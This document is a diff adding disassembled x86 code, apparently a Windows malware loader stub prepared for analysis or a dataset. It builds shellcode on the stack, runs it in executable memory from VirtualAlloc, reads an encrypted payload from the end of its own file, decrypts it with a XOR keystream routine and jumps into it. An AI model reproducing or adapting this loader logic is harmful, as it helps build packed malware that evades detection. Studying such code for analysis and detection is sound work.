@@ -1,0 +1,470 @@
+_start
+push ebp
+mov ebp esp
+sub esp 0x7c
+push ebx
+push esi
+push edi
+mov [ ebp - 0x5c ] 0xb8
+mov [ ebp - 0x5b ] 0x79
+mov [ ebp - 0x5a ] 0x95
+mov [ ebp - 0x59 ] 0x3
+and [ ebp - 0x58 ] 0x0
+mov [ ebp - 0x57 ] 0x5a
+mov [ ebp - 0x56 ] 0x59
+mov [ ebp - 0x55 ] 0x52
+mov [ ebp - 0x54 ] 0xba
+mov [ ebp - 0x53 ] 0xf4
+mov [ ebp - 0x52 ] 0x10
+and [ ebp - 0x51 ] 0x0
+and [ ebp - 0x50 ] 0x0
+mov [ ebp - 0x4f ] 0xbe
+mov [ ebp - 0x4e ] 0x8b
+mov [ ebp - 0x4d ] 0x5b
+and [ ebp - 0x4c ] 0x0
+and [ ebp - 0x4b ] 0x0
+mov [ ebp - 0x4a ] 0x66
+mov [ ebp - 0x49 ] 0xf
+mov [ ebp - 0x48 ] 0x6e
+mov [ ebp - 0x47 ] 0xc6
+mov [ ebp - 0x46 ] 0x66
+mov [ ebp - 0x45 ] 0xf
+mov [ ebp - 0x44 ] 0x6e
+mov [ ebp - 0x43 ] 0xca
+mov [ ebp - 0x42 ] 0x66
+mov [ ebp - 0x41 ] 0xf
+mov [ ebp - 0x40 ] 0x6e
+mov [ ebp - 0x3f ] 0xd1
+mov [ ebp - 0x3e ] 0x66
+mov [ ebp - 0x3d ] 0xf
+mov [ ebp - 0x3c ] 0x6e
+mov [ ebp - 0x3b ] 0xd8
+mov [ ebp - 0x3a ] 0x66
+mov [ ebp - 0x39 ] 0xf
+mov [ ebp - 0x38 ] 0x62
+mov [ ebp - 0x37 ] 0xd9
+mov [ ebp - 0x36 ] 0x66
+mov [ ebp - 0x35 ] 0xf
+mov [ ebp - 0x34 ] 0x62
+mov [ ebp - 0x33 ] 0xd0
+mov [ ebp - 0x32 ] 0x66
+mov [ ebp - 0x31 ] 0xf
+mov [ ebp - 0x30 ] 0x62
+mov [ ebp - 0x2f ] 0xda
+mov [ ebp - 0x2e ] 0x5a
+mov [ ebp - 0x2d ] 0x5e
+mov [ ebp - 0x2c ] 0x52
+mov [ ebp - 0x2b ] 0x66
+mov [ ebp - 0x2a ] 0xf
+mov [ ebp - 0x29 ] 0x7f
+mov [ ebp - 0x28 ] 0x1e
+mov [ ebp - 0x27 ] 0x66
+mov [ ebp - 0x26 ] 0xf
+mov [ ebp - 0x25 ] 0x6f
+mov [ ebp - 0x24 ] 0x6
+mov [ ebp - 0x23 ] 0x66
+mov [ ebp - 0x22 ] 0xf
+mov [ ebp - 0x21 ] 0x72
+mov [ ebp - 0x20 ] 0xf0
+mov [ ebp - 0x1f ] 0x2
+mov [ ebp - 0x1e ] 0x66
+mov [ ebp - 0x1d ] 0xf
+mov [ ebp - 0x1c ] 0x7f
+mov [ ebp - 0x1b ] 0x6
+mov [ ebp - 0x1a ] 0x8b
+mov [ ebp - 0x19 ] 0x46
+mov [ ebp - 0x18 ] 0x4
+mov [ ebp - 0x17 ] 0xc3
+mov [ ebp - 0x7c ] 0x1fcd395
+mov [ ebp - 0x78 ] 0x46
+push 0x40
+push 0x1000
+push [ ebp - 0x78 ]
+push 0x0
+call [ VirtualAlloc@IAT ]
+mov [ ebp - 0x60 ] eax
+push [ ebp - 0x78 ]
+lea eax [ ebp - 0x5c ]
+push eax
+push [ ebp - 0x60 ]
+call sub_401340
+add esp 0xc
+push 0x40
+push 0x1000
+push 0x1000
+push 0x0
+call [ VirtualAlloc@IAT ]
+mov [ ebp - 0x74 ] eax
+mov eax [ ebp - 0x74 ]
+push eax
+mov eax [ ebp - 0x7c ]
+push eax
+mov eax [ ebp - 0x60 ]
+call eax
+mov [ ebp - 0x7c ] eax
+jmp rwxdata
+and [ ebp - 0x8 ] 0x0
+mov [ ebp - 0x68 ] 0x7d52
+push 0x40
+push 0x3000
+push 0x7d52
+push 0x0
+call [ VirtualAlloc@IAT ]
+mov [ ebp - 0x8 ] eax
+cmp [ ebp - 0x8 ] 0x0
+jne rwxdata
+push 0x7d52
+push [ ebp - 0x8 ]
+push 0x0
+call [ GetModuleFileNameA@IAT ]
+test eax eax
+jne rwxdata
+jmp rwxdata
+push 0x0
+push 0x80
+push 0x3
+push 0x0
+push 0x1
+push 0x80000000
+push [ ebp - 0x8 ]
+call [ CreateFileA@IAT ]
+mov [ ebp - 0x6c ] eax
+cmp [ ebp - 0x6c ] 0xffffffff
+jne rwxdata
+jmp rwxdata
+pop edi
+pop esi
+pop ebx
+leave
+retn
+push 0x2
+push 0x0
+mov eax [ ebp - 0x68 ]
+neg eax
+push eax
+push [ ebp - 0x6c ]
+call [ SetFilePointer@IAT ]
+push 0x0
+lea eax [ ebp - 0x68 ]
+push eax
+push 0x7d52
+push [ ebp - 0x8 ]
+push [ ebp - 0x6c ]
+call [ ReadFile@IAT ]
+test eax eax
+jne rwxdata
+jmp rwxdata
+push [ ebp - 0x6c ]
+call [ CloseHandle@IAT ]
+mov eax [ ebp - 0x7c ]
+shl eax 0x4
+inc eax
+mov [ ebp - 0x7c ] eax
+mov eax [ ebp - 0x8 ]
+mov [ ebp - 0x64 ] eax
+and [ ebp - 0x4 ] 0x0
+and [ ebp - 0x70 ] 0x0
+push 0x40
+push 0x3000
+push 0x19fdd4
+push 0x0
+call [ VirtualAlloc@IAT ]
+mov [ ebp - 0x70 ] eax
+cmp [ ebp - 0x70 ] 0x0
+jne rwxdata
+jmp rwxdata
+mov eax [ ebp - 0x70 ]
+mov [ ebp - 0x4 ] eax
+push [ ebp - 0x7c ]
+push 0x7d52
+push [ ebp - 0x8 ]
+call sub_4012f9
+and [ ebp - 0x14 ] 0x0
+jmp rwxdata
+jmp rwxdata
+cmp [ ebp - 0x14 ] 0x131
+jae rwxdata
+mov eax [ ebp - 0x4 ]
+add eax 0x18b131
+push eax
+mov eax [ ebp - 0x8 ]
+add eax 0x131
+push eax
+call [ ebp - 0x64 ]
+mov eax [ ebp - 0x70 ]
+add eax 0x19dbd4
+mov [ ebp - 0xc ] eax
+push [ VirtualAlloc@IAT ]
+push [ ebp - 0x4 ]
+call [ ebp - 0xc ]
+mov eax [ ebp - 0x4 ]
+add eax [ ebp - 0x14 ]
+mov ecx [ ebp - 0x64 ]
+add ecx [ ebp - 0x14 ]
+mov cl [ ecx ]
+mov [ eax + 0x18b000 ] cl
+jmp rwxdata
+mov eax [ ebp - 0x14 ]
+inc eax
+mov [ ebp - 0x14 ] eax
+sub_4012f9
+push ebp
+mov ebp esp
+mov eax [ ebp + 0xc ]
+push esi
+xor edx edx
+push edi
+mov edi [ ebp + 0x8 ]
+lea esi [ eax - 0x1 ]
+test esi esi
+jbe rwxdata
+mov eax edi
+pop edi
+pop esi
+pop ebp
+retn 0xc
+mov eax [ ebp + 0x10 ]
+mov ecx edx
+xor ecx 0x1
+and ecx 0x7
+shr eax cl
+xor [ edx + edi ] al
+mov eax [ ebp + 0x10 ]
+imul eax eax 0xea61
+xor eax 0x24142871
+inc edx
+cmp edx esi
+mov [ ebp + 0x10 ] eax
+jb rwxdata
+sub_401340
+push ebp
+mov ebp esp
+push edi
+push esi
+mov esi [ ebp + 0xc ]
+mov ecx [ ebp + 0x10 ]
+mov edi [ ebp + 0x8 ]
+mov eax ecx
+mov edx ecx
+add eax esi
+cmp edi esi
+jbe rwxdata
+test edi 0x3
+jne rwxdata
+cmp edi eax
+jb rwxdata
+mov eax edi
+mov edx 0x3
+sub ecx 0x4
+jb rwxdata
+shr ecx 0x2
+and edx 0x3
+cmp ecx 0x8
+jb rwxdata
+lea esi [ ecx + esi - 0x4 ]
+lea edi [ ecx + edi - 0x4 ]
+test edi 0x3
+jne rwxdata
+jmp [ ecx * 4 + rwxdata ]
+and eax 0x3
+add ecx eax
+jmp [ eax * 4 + jump_table_4013a0 ]
+jmp [ ecx * 4 + jump_table_40141c ]
+[ edi ] [ esi ]
+jmp [ edx * 4 + jump_table_401488 ]
+mov eax edi
+mov edx 0x3
+cmp ecx 0x4
+jb rwxdata
+shr ecx 0x2
+and edx 0x3
+cmp ecx 0x8
+jb rwxdata
+and edx ecx
+mov al [ esi ]
+mov [ edi ] al
+mov al [ esi + 0x1 ]
+mov [ edi + 0x1 ] al
+mov al [ esi + 0x2 ]
+shr ecx 0x2
+mov [ edi + 0x2 ] al
+add esi 0x3
+add edi 0x3
+cmp ecx 0x8
+jb rwxdata
+and edx ecx
+mov al [ esi ]
+mov [ edi ] al
+mov al [ esi + 0x1 ]
+shr ecx 0x2
+mov [ edi + 0x1 ] al
+add esi 0x2
+add edi 0x2
+cmp ecx 0x8
+jb rwxdata
+and edx ecx
+mov al [ esi ]
+mov [ edi ] al
+inc esi
+shr ecx 0x2
+inc edi
+cmp ecx 0x8
+jb rwxdata
+mov eax [ esi + ecx * 4 - 0x1c ]
+mov [ edi + ecx * 4 - 0x1c ] eax
+mov eax [ esi + ecx * 4 - 0x18 ]
+mov [ edi + ecx * 4 - 0x18 ] eax
+mov eax [ esi + ecx * 4 - 0x14 ]
+mov [ edi + ecx * 4 - 0x14 ] eax
+mov eax [ esi + ecx * 4 - 0x10 ]
+mov [ edi + ecx * 4 - 0x10 ] eax
+mov eax [ esi + ecx * 4 - 0xc ]
+mov [ edi + ecx * 4 - 0xc ] eax
+mov eax [ esi + ecx * 4 - 0x8 ]
+mov [ edi + ecx * 4 - 0x8 ] eax
+mov eax [ esi + ecx * 4 - 0x4 ]
+mov [ edi + ecx * 4 - 0x4 ] eax
+lea eax [ ecx * 4 ]
+add esi eax
+add edi eax
+jmp [ edx * 4 + jump_table_401488 ]
+mov eax [ ebp + 0x8 ]
+pop esi
+pop edi
+leave
+retn
+mov al [ esi ]
+mov [ edi ] al
+mov eax [ ebp + 0x8 ]
+pop esi
+pop edi
+leave
+retn
+mov al [ esi ]
+mov [ edi ] al
+mov al [ esi + 0x1 ]
+mov [ edi + 0x1 ] al
+mov eax [ ebp + 0x8 ]
+pop esi
+pop edi
+leave
+retn
+mov al [ esi ]
+mov [ edi ] al
+mov al [ esi + 0x1 ]
+mov [ edi + 0x1 ] al
+mov al [ esi + 0x2 ]
+mov [ edi + 0x2 ] al
+mov eax [ ebp + 0x8 ]
+pop esi
+pop edi
+leave
+retn
+jmp [ ecx * 4 + jump_table_401620 ]
+and eax 0x3
+sub ecx eax
+jmp [ eax * 4 + jump_table_401528 ]
+neg ecx
+jmp [ ecx * 4 + rwxdata ]
+std
+[ edi ] [ esi ]
+cld
+jmp [ edx * 4 + jump_table_401620 ]
+[ edi ] [ esi ]
+jmp [ edx * 4 + jump_table_401488 ]
+[ edi ] [ esi ]
+jmp [ edx * 4 + jump_table_401488 ]
+[ edi ] [ esi ]
+jmp [ edx * 4 + jump_table_401488 ]
+mov eax [ ebp + 0x8 ]
+pop esi
+pop edi
+leave
+retn
+mov al [ esi + 0x3 ]
+mov [ edi + 0x3 ] al
+mov eax [ ebp + 0x8 ]
+pop esi
+pop edi
+leave
+retn
+mov al [ esi + 0x3 ]
+mov [ edi + 0x3 ] al
+mov al [ esi + 0x2 ]
+mov [ edi + 0x2 ] al
+mov eax [ ebp + 0x8 ]
+pop esi
+pop edi
+leave
+retn
+mov al [ esi + 0x3 ]
+mov [ edi + 0x3 ] al
+mov al [ esi + 0x2 ]
+mov [ edi + 0x2 ] al
+mov al [ esi + 0x1 ]
+mov [ edi + 0x1 ] al
+mov eax [ ebp + 0x8 ]
+pop esi
+pop edi
+leave
+retn
+mov al [ esi + 0x3 ]
+and edx ecx
+mov [ edi + 0x3 ] al
+dec esi
+shr ecx 0x2
+dec edi
+cmp ecx 0x8
+jb rwxdata
+mov al [ esi + 0x3 ]
+and edx ecx
+mov [ edi + 0x3 ] al
+mov al [ esi + 0x2 ]
+shr ecx 0x2
+mov [ edi + 0x2 ] al
+sub esi 0x2
+sub edi 0x2
+cmp ecx 0x8
+jb rwxdata
+mov al [ esi + 0x3 ]
+and edx ecx
+mov [ edi + 0x3 ] al
+mov al [ esi + 0x2 ]
+mov [ edi + 0x2 ] al
+mov al [ esi + 0x1 ]
+shr ecx 0x2
+mov [ edi + 0x1 ] al
+sub esi 0x3
+sub edi 0x3
+cmp ecx 0x8
+jb rwxdata
+mov eax [ esi + ecx * 4 + 0x1c ]
+mov [ edi + ecx * 4 + 0x1c ] eax
+mov eax [ esi + ecx * 4 + 0x18 ]
+mov [ edi + ecx * 4 + 0x18 ] eax
+mov eax [ esi + ecx * 4 + 0x14 ]
+mov [ edi + ecx * 4 + 0x14 ] eax
+mov eax [ esi + ecx * 4 + 0x10 ]
+mov [ edi + ecx * 4 + 0x10 ] eax
+mov eax [ esi + ecx * 4 + 0xc ]
+mov [ edi + ecx * 4 + 0xc ] eax
+mov eax [ esi + ecx * 4 + 0x8 ]
+mov [ edi + ecx * 4 + 0x8 ] eax
+mov eax [ esi + ecx * 4 + 0x4 ]
+mov [ edi + ecx * 4 + 0x4 ] eax
+lea eax [ ecx * 4 ]
+add esi eax
+add edi eax
+jmp [ edx * 4 + jump_table_401620 ]
+std
+[ edi ] [ esi ]
+cld
+jmp [ edx * 4 + jump_table_401620 ]
+std
+[ edi ] [ esi ]
+cld
+jmp [ edx * 4 + jump_table_401620 ]
+std
+[ edi ] [ esi ]
+cld
+jmp [ edx * 4 + jump_table_401620 ]
